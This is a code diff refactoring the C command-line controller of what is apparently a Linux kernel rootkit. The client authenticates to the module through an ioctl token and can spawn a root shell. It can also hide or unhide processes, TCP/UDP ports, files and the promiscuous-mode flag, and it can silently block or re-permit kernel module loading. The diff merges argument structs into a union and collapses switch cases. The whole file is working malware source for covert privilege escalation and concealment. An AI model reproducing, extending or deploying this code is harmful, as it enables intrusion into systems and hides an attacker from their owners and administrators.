@@ -13,36 +13,51 @@
 
 #define SHELL "/bin/sh" // Linux
 
-struct rk_proc_args
-{
-    unsigned short pid;
-};
+// struct rk_proc_args
+// {
+//     unsigned short pid;
+// };
 
-struct rk_port_args
-{
-    unsigned short port;
-};
+// struct rk_port_args
+// {
+//     unsigned short port;
+// };
 
-struct rk_file_args
-{
-    char *name;
-    unsigned short namelen;
-};
+// struct rk_file_args
+// {
+//     char *name;
+//     unsigned short namelen;
+// };
+
+// struct rk_args
+// {
+//     unsigned short cmd;
+//     void *ptr;
+// };
 
 struct rk_args
 {
     unsigned short cmd;
-    void *ptr;
+    union
+    {
+        unsigned short num;
+        unsigned short pid;
+        unsigned short port;
+        unsigned short namelen;
+    };
+    char *name;
 };
 
 int main(int argc, char *argv[])
 {
     struct rk_args rk_args;
-    struct rk_proc_args rk_proc_args;
-    struct rk_port_args rk_port_args;
-    struct rk_file_args rk_file_args;
+    // struct rk_proc_args rk_proc_args;
+    // struct rk_port_args rk_port_args;
+    // struct rk_file_args rk_file_args;
     int sockfd;
     int io;
+    unsigned short cmd;
+    unsigned short num;
 
     sockfd = socket(AF_INET, SOCK_STREAM, 6);
     if (sockfd < 0)
@@ -51,221 +66,63 @@ int main(int argc, char *argv[])
         exit(1);
     }
 
-    switch (atoi(argv[1]))
+    cmd = atoi(argv[1]);
+    rk_args.cmd = cmd;
+
+    switch (cmd)
     {
     case 0:
         printf("Dropping to root shell\n");
-        rk_args.cmd = 0;
         io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
         execl(SHELL, "zsh", NULL);
         break;
 
-    case 1:
+    case 1: // Hide Proc
+    case 2: // Unhide Proc
     {
         unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);
+
         printf("Hiding PID %hu\n", pid);
 
-        rk_proc_args.pid = pid;
-        rk_args.cmd = 1;
-        rk_args.ptr = &rk_proc_args;
+        rk_args.pid = pid;
 
         io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
     }
     break;
 
-    case 2:
-    {
-        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);
-        printf("Unhiding PID %hu\n", pid);
-
-        rk_proc_args.pid = pid;
-        rk_args.cmd = 2;
-        rk_args.ptr = &rk_proc_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 3:
+    case 3:  // Hide tcp 4 port
+    case 4:  // Unide tcp 4 port
+    case 5:  // Hide tcp 6 port
+    case 6:  // Unide tcp 6 port
+    case 7:  // Hide udp 4 port
+    case 8:  // Unide udp 4 port
+    case 9:  // Hide udp 6 port
+    case 10: // Unide udp 6 port
     {
         unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
 
-        printf("Hiding TCPv4 port %hu\n", port);
+        printf("Hiding/Unhiding port %hu\n", port);
 
-        rk_port_args.port = port;
-        rk_args.cmd = 3;
-        rk_args.ptr = &rk_port_args;
+        rk_args.port = port;
 
         io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
     }
     break;
 
-    case 4:
+    case 11: // Hide file
+    case 12: // Unhide file
     {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Unhiding TCPv4 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 4;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+        printf("Hiding/Unhiding file %s\n", argv[2]);
+        rk_args.name = argv[2];
+        rk_args.namelen = strlen(argv[2]);
     }
-    break;
-    case 5:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Hiding TCPv6 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 5;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 6:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Unhiding TCPv6 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 6;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 7:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Hiding UDPv4 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 7;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 8:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Unhiding UDPv4 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 8;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 9:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Hiding UDPv6 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 9;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 10:
-    {
-        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-
-        printf("Unhiding UDPv6 port %hu\n", port);
-
-        rk_port_args.port = port;
-        rk_args.cmd = 10;
-        rk_args.ptr = &rk_port_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 11:
-    {
-        char *name = argv[2];
-
-        printf("Hiding file/dir %s\n", name);
-
-        rk_file_args.name = name;
-        rk_file_args.namelen = strlen(name);
-        rk_args.cmd = 11;
-        rk_args.ptr = &rk_file_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 12:
-    {
-        char *name = argv[2];
-
-        printf("Unhiding file/dir %s\n", name);
-
-        rk_file_args.name = name;
-        rk_file_args.namelen = strlen(name);
-        rk_args.cmd = 12;
-        rk_args.ptr = &rk_file_args;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
-
-    case 13:
-        printf("Hiding network PROMISC flag\n");
-        rk_args.cmd = 13;
+    case 13: // Hide PROMISC
+    case 14: // Unhide PROMISC
+    case 15: // Enable module loading
+    case 16: // Prohibit module loading
+    case 17: // Re-permit module loading
         io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
         break;
-
-    case 14:
-        printf("Unhiding network PROMISC flag\n");
-        rk_args.cmd = 14;
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-        break;
-
-    case 15:
-        printf("Enabling module loading\n");
-        rk_args.cmd = 15;
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-        break;
-
-    case 16:
-        printf("Silently prohibiting module loading\n");
-        rk_args.cmd = 16;
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-        break;
-
-    case 17:
-        printf("Silently re-permitting module loading\n");
-        rk_args.cmd = 17;
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-        break;
-
-    case 100:
-    {
-        printf("Null command\n");
-
-        rk_args.cmd = 100;
-
-        io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-    }
-    break;
 
     default:
     {
